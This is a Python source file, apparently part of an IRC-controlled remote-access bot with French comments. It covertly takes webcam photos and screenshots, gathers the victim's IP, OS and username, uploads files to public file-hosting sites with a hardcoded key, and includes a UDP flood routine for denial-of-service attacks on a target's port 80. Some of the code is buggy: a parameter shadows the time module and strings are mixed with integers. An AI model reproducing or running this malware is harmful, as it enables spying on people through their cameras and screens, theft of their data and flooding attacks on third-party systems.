from urllib.request import urlopen
from platform import platform
import os
import socket
import numpy as np
import cv2
import base64
import platform
import pyautogui
import time
import requests
import ftplib
import requests
import random
import wmi
import threading
import getpass
import subprocess

def upload_file(filePath):      #ne marche pas
    files = {
        'key': (None, '5cKOWn0nNVVb1J2jdiBkMOtrJ3sIbQtE'),
        'file': (filePath, open(filePath, 'rb')),
    }

    return requests.post('https://filebin.ca/upload.php',  files=files).text.split("url:")[1].strip()



def post_img(file):
    try:
        print("sending: " + file)

        files = {
            'key': (None, '5cKOWn0nNVVb1J2jdiBkMOtrJ3sIbQtE'),
            'file': (file, open(file, 'rb')),
        }

        return requests.post('https://imagebin.ca/upload.php', files=files).text.split("url:")[1].strip()


    except:
        return "http://thereisanerror"

def info():      #pour recup l'ip et l'os
    
    return get_ip() + "::" + str(platform.platform() + "::"+getpass.getuser())

def get_ip():
    page = urlopen("http://www.monip.org/").read().decode("utf-8")
    return str(page.split("IP : ")[1].split("<br>")[0])


def genRandomName(charNb=6):
    stringbuilder = ""
    for x in range(charNb):
        stringbuilder += random.choice("1234567890abcdef")
    return stringbuilder


def takePicture():
    cam = cv2.VideoCapture(0)
    for k in range(4):
        cam.read()
    rt, frame = cam.read()
    cam.release()
    img_name = genRandomName()+".png"
    cv2.imwrite(img_name, frame)
    cam.release()
    return img_name


def screenshot():
    image = pyautogui.screenshot()
    img_name = genRandomName()+".png"
    image.save(img_name)
    return img_name


def udp_flooding(target, time, c, nick):      #async pas au point pour le moment et nettement optimisable(script de flood en udp)
    timeout =  time.time() + int(time)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    buffer = "1234567890abcdef"
    sent = 0

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(buffer, (target, 80))     #sur le port 80 oui 
        sent = sent + 1
    c.notice(nick, "Attacking "+ sent +"sent packages "+ target +" at the port " + 80)

